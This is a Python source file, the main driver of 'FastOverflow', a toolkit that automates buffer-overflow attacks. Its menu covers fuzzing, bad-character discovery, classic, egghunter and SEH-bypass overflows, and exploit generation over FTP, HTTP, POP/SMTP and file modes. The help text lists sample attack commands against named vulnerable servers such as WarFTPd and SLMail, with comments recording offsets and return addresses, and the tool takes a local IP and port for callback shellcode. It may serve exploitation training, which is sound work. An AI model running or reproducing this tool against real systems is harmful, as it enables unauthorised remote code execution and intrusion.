#!/usr/bin/python3
import argparse
import random
import shutil
import string
from time import sleep
import readline

from buffers.egghunter import EggHunter
from buffers.seh import Seh
from protocols.ftp import *

from buffers.classic import *
from utils.colors import *
from utils.system import *
from utils.config import *

class FastOverflow:

    tm_columns = 150

    def __init__(self, config):
        self.config = config

    def menu(self):

        print(" ")
        print("-" * self.tm_columns)

        if (self.config.mode != "file"):
            print("[1] Simple Fuzzer (AAAA)")
            print("[2] Random Fuzzer (A1@!)")
            print("[3] Test Multiple Fields")

        print("[5] Classic Buffer Overflow")
        print("[6] EggHunter Buffer Overflow")
        print("[7] SEH ByPass Buffer Overflow")
        # print("[] ByPass SEH + Egghunter")

        print("[8] Search BadChars")

        print("[9] Show Exploit Session")

        if (self.config.mode.lower() in {"ftp", "popsmtp"}):
            print("[10] Generate Exploit")

        print("[11] Hexa Numeric Decomposition")

        print("[0] Exit")

        process = System.input("Select one above :")

        if (process == "1"):
            self.generic_fuzzer()
        elif (process == "2"):
            print(self.random_fuzzer())
        elif (process == "3"):
            print(self.fuzz_fields())

        if (process == "5"):
            self.classical_overflow()
        elif (process == "6"):
            self.egghunter_overflow()
        elif (process == "7"):
            self.seh_overflow()
        elif (process == "8"):
            self.search_badchars()
        elif (process == "9"):
            System.show_session(self.config)
            self.menu()
        elif (process == "10"):
            System.generate_exploit(self.config)
        elif (process == "11"):
            System.hex_decomposition(self.config)
        elif (process == "0"):
            sys.exit(0)

    ############################
    ## SEARCHING FOR BADCHARS

    def test_badchars(self):

        bads = System.input("[+] Badchars detected : " + ",".join(System.badchars) + "! Additional badchars? Separate multiple by commas [40,0a]: ")

        if ',' in bads:
            _bads = bads.split(',')
            for _badchar in _bads:
                System.badchars.append(r'\x'+_badchar.trim())
        elif bads != "":
            System.badchars.append(r'\x'+bads.trim())

        print("Got bad chars:\n" + ', '.join(System.badchars))

    def search_badchars(self):
        global columns

        adapter = System.get_adapter(self.config)
        inject_func = getattr(adapter, 'inject')

        System.input("[!] All set! Press ENTER when your debugger is ready to receive a single byte sequences :")

        for x in System.nonprint_chars:
            buffer = x

            print("\n\r[!] ############# Testing char " + str(len(buffer)) + " ----> " + (r'\x{:x}'.format(ord(x))))

            try:
                buffer += "\r\n"

                responses = inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
                for response in responses:
                    if "Illegal" in response.decode("latin-1"):
                        System.badchars.append(r'\x{:x}'.format(ord(x)))
                        # print(response + ' -- CHARACTER: ' + hex(ord(x)))

            except socket.error as error:
                print(error)

        print("=" * self.tm_columns)
        print("Found the following bad chars:\n" + ', '.join(System.badchars))
        self.config.badchars = System.badchars
        print("=" * self.tm_columns)
        print("")

        System.save_session(self.config)

        self.menu()

    def fuzz_fields(self):
        adapter = System.get_adapter(self.config)
        inject_func = getattr(adapter, 'inject')

        print("Current Fields: " + self.config.field)
        self.config.fields = "," + System.input("[?] Input any additional fields separated by comma : ")

        for field in self.config.field.split(","):
            buffer = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10000))

            print("-" * self.tm_columns)
            print("[!] Sending randomized buffer on " + field)

            overflow = inject_func(self.config.remoteip, self.config.remoteport, field, buffer, True)
            print("[*] Waiting 3 seconds... ")
            sleep(3)

    def random_fuzzer(self):
        self.config.offset = 0
        self.config.overflow = 0
        self.config.fuzzer_type = "printables"

        System.generic_fuzzer(self.config)
        self.menu()

    def generic_fuzzer(self):

        System.generic_fuzzer(self.config)
        self.menu()

    ############################
    # OVERFLOW PROCESSES

    def classical_overflow(self):

        process = Classic(self.config)
        process.exploit()

    def egghunter_overflow(self):

        process = EggHunter(self.config)
        process.exploit()

    def seh_overflow(self):

        process = Seh(self.config)
        process.exploit()

def help():
    global _tm_columns

    print("=" * _tm_columns + "\r\n")
    print("Samples: \n\r\n\r"
          "WarFTPd             ./fast_overflow.py -m ftp -t 172.16.18.128 -p 21 -f user\r\n" # : 485, 32714131, 7c941eed, 16 NOPs"
          "Ability FTP Server  ./fast_overflow.py -m ftp -t 172.16.18.128 -p 21 -f stor -U ftp -P ftp\r\n" # : 968, 33674232, 77fab127, 32 NOPs\n\r"
          "SLMail              ./fast_overflow.py -m popsmtp -t 172.16.18.128 -p 110 -f pass\r\n" # : 2606, 7608BCCF, 77fab127, 16 NOPs\n\r")
          "Video Players       ./fast_overflow.py -m file -i 172.16.18.1 -l 7777\r\n"
          "Konica Minolta      ./fast_overflow.py -m ftp -t 172.16.18.138 -p 21 -f cwd\r\n" # SEH : 1037, 1220401E, 8 NOPs\n\r"
          "Kolibri             ./fast_overflow.py -m http -t 172.16.18.128 -p 8080 -f uri -hm head\r\n" # EggHunting : 515, 32724131, c, 011EFB28, 011EFAF4, 8 NOPs\n\r"# )
           );

    print("For detailed usage please use help (-h)! ")

    sys.exit(1)

def initArgs():
    parser = argparse.ArgumentParser(description="Fast Overflow Toolkit")
    parser.add_argument('-m', '--mode', type=str, help='Specify mode for buffer overflow. Accepted : ftp | http | popsmtp | file')
    parser.add_argument('-o', '--os', type=str, default='windows', help='Target OS Platform for shellcode. Accepted: windows | unix | linux | mac')
    parser.add_argument('-t', '--target', type=str, help='Target to attack. Not used in FILE mode')
    parser.add_argument('-p', '--port', type=str, help='Port to attack. Not used in FILE mode')
    parser.add_argument('-f', '--fields', type=str, help='Set fields to exploit: user, pass, stor, cookie, user-agent. Not used in FILE mode')
    parser.add_argument('-hm', '--http-method', default='HEAD', type=str, help='Set HTTP method to exploit: GET, HEAD, POST, TRACE, etc. Default: HEAD')
    parser.add_argument('-u', '--http-uri', default='/', type=str, help='Set HTTP base uri to exploit. Default: /') # Todo: set uri argument
    parser.add_argument('-i', '--lip', type=str, help='Local IP for shellcode')
    parser.add_argument('-l', '--lport', type=str, help='Local Port for shellcode')
    parser.add_argument('-U', '--auth-user', type=str, default='user', help='User for auth. Default: user')
    parser.add_argument('-P', '--auth-pass', type=str, default='user', help='Pass for auth. Default: user')
    # parser.add_argument('-si', '--session-ignore', default='False', help='Ignore session file. Default: no')
    # parser.add_argument('-v', '--verbose', type=int, default='2', help='Verbose level. Default: 2')

    return parser.parse_args()

def main(args):
    global _tm_columns
    # os.system("clear")

    print("")
    print("#" * _tm_columns + "\r\n")
    print("# FastOverflow v1.0-rc - A toolkit for automating Buffer Overflow process")
    print("# Currently supporting Vanilla, SEH Bypass, EggHunter through HTTP, FTP, POP, SMTP and File")
    print("")
    print("# By Daniel (daniel@zillius.com.br) ")
    print("")
    print("#" * _tm_columns + "\r\n")

    _c = Config()

    if(args.mode != None):
        if (args.mode.lower() in {"ftp", "popsmtp", "http", "file"}):
            _c.mode = args.mode.lower()
        else:
            print("[!] Invalid Mode!!! \r\n")
            help()
    else:
        print("[!] Missing Mode!!! \r\n")
        help()

    if (args.os != None):
        _c.platform = args.os

    if (args.target != None):
        _c.remoteip = args.target

    if (args.port != None):
        _c.remoteport = args.port

    if (args.fields != None):
        _c.field = args.fields

    if (args.http_method != None):
        _c.http_method = args.http_method.upper()

    if (args.http_uri != None):
        _c.httpuri = args.http_uri

    if (args.lip != None):
        _c.localip = args.lip

    if (args.lport != None):
        _c.localport = args.lport

    if (args.auth_user != None):
        _c.user = args.auth_user

    if (args.auth_pass != None):
        _c.passwd = args.auth_pass

    if (_c.mode == "file"):
        _c.remoteip = "file"
        _c.remoteport = 0
    else:
        if (_c.remoteip == None or _c.remoteip == ""):
            print("[!] Missing Target!!! \r\n")
            help()
            sys.exit(0);

        if (_c.remoteport == None or _c.remoteport == 0):
            print("[!] Missing Remote Port!!! \r\n")
            help()
            sys.exit(0);

    try:
        System.load_session(_c)

        _f = FastOverflow(_c)
        _f.tm_columns = _tm_columns
        _f.menu()

    except KeyboardInterrupt:
        save = System.input("[?] Do you want to save your progress data? [Y]es/[n]o : ")
        if save == "Y":
            System.save_session(_c)

        sys.exit(1)

if __name__ == "__main__":
    _tm_columns, _tm_rows = shutil.get_terminal_size((80, 20))
    main(initArgs())


